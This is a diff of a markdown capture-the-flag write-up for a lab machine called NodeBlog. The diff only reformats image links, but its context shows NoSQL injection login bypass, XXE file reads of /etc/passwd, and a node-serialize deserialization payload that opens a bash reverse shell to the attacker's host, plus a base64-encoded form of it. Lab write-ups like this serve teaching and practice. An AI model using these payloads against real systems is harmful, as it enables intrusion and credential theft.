@@ -37,7 +37,7 @@ Now run a standard nmap scan on the target machine by using the obtained IP addr
 
 Command: `nmap -A -T4 -v <Target_IP Address>`
 
-![[NodeBlog/assets/Untitled.png|Untitled.png]]
+![Untitled.png](NodeBlog/assets/Untitled.png)
 
 From the obtained results, we could see that the SSH service is running on port 22 and on port 5000 there is a Node.js server is running. From the http-title of port 5000, we can devise that, it is a Node.js Blog Web Site, which uses the Express.js to handle requests.
 
@@ -45,19 +45,19 @@ From the obtained results, we could see that the SSH service is running on port 
 
 Now we can take a look at the blog web site running on port 5000.
 
-![[NodeBlog/assets/Untitled 1.png|Untitled 1.png]]
+![Untitled 1.png](NodeBlog/assets/Untitled%201.png)
 
 We can see that there is a Login button, which takes us to the login page.
 
-![[NodeBlog/assets/Untitled 2.png|Untitled 2.png]]
+![Untitled 2.png](NodeBlog/assets/Untitled%202.png)
 
 And there is a Read More button, which takes us to the detailed view of the blog that is present over there.
 
-![[NodeBlog/assets/Untitled 3.png|Untitled 3.png]]
+![Untitled 3.png](NodeBlog/assets/Untitled%203.png)
 
 There is no robots.txt file.
 
-![[NodeBlog/assets/Untitled 4.png|Untitled 4.png]]
+![Untitled 4.png](NodeBlog/assets/Untitled%204.png)
 
 Next I ran gobuster on the blog website to find other hidden directories and paths.
 
@@ -75,7 +75,7 @@ username: `test`
 
 password: `test`
 
-![[NodeBlog/assets/Untitled 5.png|Untitled 5.png]]
+![Untitled 5.png](NodeBlog/assets/Untitled%205.png)
 
 I got the response as Invalid username.
 
@@ -85,7 +85,7 @@ username: `admin`
 
 password: `admin`
 
-![[NodeBlog/assets/Untitled 6.png|Untitled 6.png]]
+![Untitled 6.png](NodeBlog/assets/Untitled%206.png)
 
 This time I got the response back as `Invalid Password`, which shows that a user with a username admin exists.
 
@@ -95,7 +95,7 @@ I tried some of the NoSQL authentication bypass payloads from the following site
 
 I used JSON format payloads given in the above mentioned site, since its more reliable and easy to format.
 
-![[NodeBlog/assets/Untitled 7.png|Untitled 7.png]]
+![Untitled 7.png](NodeBlog/assets/Untitled%207.png)
 
 To send the data in JSON format in burpsuite, you have to change the value of the `content-type` header to `application/json`. Now change the data from “`user=admin&password=admin`” to JSON format:
 
@@ -108,7 +108,7 @@ To send the data in JSON format in burpsuite, you have to change the value of th
 
 And make sure the request works as before.
 
-![[NodeBlog/assets/Untitled 8.png|Untitled 8.png]]
+![Untitled 8.png](NodeBlog/assets/Untitled%208.png)
 
   
 
@@ -131,13 +131,13 @@ payload:
 
 Now send the login request with the payload.
 
-![[NodeBlog/assets/Untitled 9.png|Untitled 9.png]]
+![Untitled 9.png](NodeBlog/assets/Untitled%209.png)
 
 You can see that we have successfully bypassed the authentication and we have logged in. This shows that the application is vulnerable to NoSQL injection.
 
 Since, we have found that the application is vulnerable to NoSQL Injection, we can try to extract the password of the user `admin` using the following payload.
 
-![[NodeBlog/assets/Untitled 10.png|Untitled 10.png]]
+![Untitled 10.png](NodeBlog/assets/Untitled%2010.png)
 
 The above mentioned payload uses regular expression to check whether the password is starting with the mentioned letter. I have created a python script which loops through all the letters in the ASCII encoding and extracts the password using the above mentioned payload:
 
@@ -189,7 +189,7 @@ while status:
 
 We have extracted the password using the above script:
 
-![[NodeBlog/assets/Untitled 11.png|Untitled 11.png]]
+![Untitled 11.png](NodeBlog/assets/Untitled%2011.png)
 
 Now, we can login to this application either by using the password that we extracted or by bypassing the authentication.
 
@@ -197,19 +197,19 @@ Now, we can login to this application either by using the password that we extra
 
 After logging in to the application, we can see a upload button.
 
-![[NodeBlog/assets/Untitled 12.png|Untitled 12.png]]
+![Untitled 12.png](NodeBlog/assets/Untitled%2012.png)
 
 When I clicked the upload button, It opened a file upload dialogue box.
 
-![[NodeBlog/assets/Untitled 13.png|Untitled 13.png]]
+![Untitled 13.png](NodeBlog/assets/Untitled%2013.png)
 
 Since this is a Node.js application, I tried to upload a Javascript reverse shell.
 
-![[NodeBlog/assets/Untitled 14.png|Untitled 14.png]]
+![Untitled 14.png](NodeBlog/assets/Untitled%2014.png)
 
 But it thrown me the above error. I tried to upload the file again, but this time I intercepted the request using burpsuite.
 
-![[NodeBlog/assets/Untitled 15.png|Untitled 15.png]]
+![Untitled 15.png](NodeBlog/assets/Untitled%2015.png)
 
 From the above output, we can see that the application is expecting an XML file, with the following format:
 
@@ -241,13 +241,13 @@ First I tried to view the contents of the `/etc/passwd` file. I uploaded the fol
 
 The payload successfully worked and we can see the `/etc/passwd` file contents:
 
-![[NodeBlog/assets/Untitled 16.png|Untitled 16.png]]
+![Untitled 16.png](NodeBlog/assets/Untitled%2016.png)
 
 Now we can try to view the contents of the server source code. But we don’t know the source code is located in the server.
 
 While I was trying to figure out the location of the source code, I got the following error, when I typed the syntax of the JSON data that we enter in the request during login:
 
-![[NodeBlog/assets/Untitled 17.png|Untitled 17.png]]
+![Untitled 17.png](NodeBlog/assets/Untitled%2017.png)
 
 From the error I got, we can see that the blog application is located at `/opt/blog`. Since this is a Node.js application, most developers will name their main server file as any one of the following:
 
@@ -269,11 +269,11 @@ I tried to look out for the `server.js` in the `/opt/blog` location by uploading
 
 And we got the contents of the server.js file.
 
-![[NodeBlog/assets/Untitled 18.png|Untitled 18.png]]
+![Untitled 18.png](NodeBlog/assets/Untitled%2018.png)
 
 I saved this content to a file in my local machine to view it in VScode.
 
-![[NodeBlog/assets/Untitled 19.png|Untitled 19.png]]
+![Untitled 19.png](NodeBlog/assets/Untitled%2019.png)
 
 From the first few lines of the code, we can see that the applications is using the `node-serialize` library. I googled for node-serialize and found the following: [https://security.snyk.io/package/npm/node-serialize](https://security.snyk.io/package/npm/node-serialize)
 
@@ -281,11 +281,11 @@ The `node-serialize` library is vulnerable to arbitrary code execution.
 
 In the target application, the node serialize module is used to unserialize the cookie from the request. But if you check the server.js code, you can see that the authenticated function is called only for the get request to `/` route.
 
-![[NodeBlog/assets/Untitled 20.png|Untitled 20.png]]
+![Untitled 20.png](NodeBlog/assets/Untitled%2020.png)
 
 So, to exploit the `node-serialize` library, we have to send a get request and capture it using burpsuite.
 
-![[NodeBlog/assets/Untitled 21.png|Untitled 21.png]]
+![Untitled 21.png](NodeBlog/assets/Untitled%2021.png)
 
 Now send the captured request to the repeater tab. Now we can use the payload to exploit the `node-serialize` library. I got the payload for this vulnerability from the following site: [https://security.snyk.io/vuln/npm:node-serialize:20170208](https://security.snyk.io/vuln/npm:node-serialize:20170208). I have slightly modified the payload, which now will execute a reverse shell on successful execution.
 
@@ -296,7 +296,7 @@ Now send the captured request to the repeater tab. Now we can use the payload to
 
 Now replace the value of auth cookie with the above payload in the repeater tab and send the request. Before sending a request, make sure to start a netcat listener on your local machine on port 9001.
 
-![[NodeBlog/assets/Untitled 22.png|Untitled 22.png]]
+![Untitled 22.png](NodeBlog/assets/Untitled%2022.png)
 
 It didn’t work. If you check the payload in the repeater tab, its highlighted in two different colours, which because the payload is broken into two parts due to the semicolon `;` in the payload. So, this time I encoded the semicolon with URL encoding and also I replace all the single quotes with double quotes i.e, `‘` replaced with `“`, then I send the request. The URL encoded value of semicolon is `%3b`.
 
@@ -305,13 +305,13 @@ It didn’t work. If you check the payload in the repeater tab, its highlighted 
 {"rce":"_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"bash -i >& /dev/tcp/<tun0_IP>/9001 0>&1\", function(error, stdout, stderr) { console.log(stdout) })%3b}()"}
 ```
 
-![[NodeBlog/assets/Untitled 23.png|Untitled 23.png]]
+![Untitled 23.png](NodeBlog/assets/Untitled%2023.png)
 
 But this time also I haven’t got back the response.
 
 So this time I encoded the command which is in the payload using `base64` algorithm.
 
-![[NodeBlog/assets/Untitled 24.png|Untitled 24.png]]
+![Untitled 24.png](NodeBlog/assets/Untitled%2024.png)
 
 But if you send this base64 string as it is in the payload it won’t work, because the base64 string is not a valid command in linux. So we have to find a way to decode this while execution. So I constructed a bash command to decode this.
 
@@ -319,7 +319,7 @@ Command:
 
 `echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45MC85MDAxIDA+JjE= | base64 -d`
 
-![[NodeBlog/assets/Untitled 25.png|Untitled 25.png]]
+![Untitled 25.png](NodeBlog/assets/Untitled%2025.png)
 
 Now replace the command with the above command and send the request.
 
@@ -332,47 +332,47 @@ Now replace the command with the above command and send the request.
 > [!important]  
 > Make sure to update your tun0 IP address.  
 
-![[NodeBlog/assets/Untitled 26.png|Untitled 26.png]]
+![Untitled 26.png](NodeBlog/assets/Untitled%2026.png)
 
 This time I got the request back, and also I got the reverse shell also In the netcat listener.
 
-![[NodeBlog/assets/Untitled 27.png|Untitled 27.png]]
+![Untitled 27.png](NodeBlog/assets/Untitled%2027.png)
 
 Now I searched for the user flag using the find command and found it.
 
-![[NodeBlog/assets/Untitled 28.png|Untitled 28.png]]
+![Untitled 28.png](NodeBlog/assets/Untitled%2028.png)
 
 Next we have to escalate our privileges to find the root flag.
 
 If you take a look at the server.js file, we can see that the mongoose.connect method is used to connect to the MongoDB, which is running in localhost.
 
-![[NodeBlog/assets/Untitled 29.png|Untitled 29.png]]
+![Untitled 29.png](NodeBlog/assets/Untitled%2029.png)
 
 So I checked out for the MongoDB console. I typed the command `mongo` and got the MongoDB shell.
 
-![[NodeBlog/assets/Untitled 30.png|Untitled 30.png]]
+![Untitled 30.png](NodeBlog/assets/Untitled%2030.png)
 
 First I used the `show dbs` command to list all the available databases.
 
-![[NodeBlog/assets/Untitled 31.png]]
+![Untitled 31](NodeBlog/assets/Untitled%2031.png)
 
 From the listed dbs, the most appealing one is the `blog` db. So I selected the `blog` db using the command `use blog`. Next I tried to view the collections ( aka tables ) in the database `blog` using the command `show collections`.
 
-![[NodeBlog/assets/Untitled 32.png]]
+![Untitled 32](NodeBlog/assets/Untitled%2032.png)
 
 And we can see that there is a collection named `users`. I tried to read the contents of the `users` collection using the command `db.users.find()`.
 
-![[NodeBlog/assets/Untitled 33.png]]
+![Untitled 33](NodeBlog/assets/Untitled%2033.png)
 
 We got the password for the user `admin` which we have already enumerated using the Password Enumeration script. Now we can try to use this password to escalate our privilege as root user.
 
 To switch user or to enter password to escalate our privilege, we need a more stable shell which we can spawn using the command: `python3 -c 'import pty; pty.spawn("/bin/sh")’`.
 
-![[NodeBlog/assets/Untitled 34.png]]
+![Untitled 34](NodeBlog/assets/Untitled%2034.png)
 
 And we have escalated our privilege as root. Now search for the root flag.
 
-![[NodeBlog/assets/Untitled 35.png]]
+![Untitled 35](NodeBlog/assets/Untitled%2035.png)
 
 And finally we got the root flag.
 
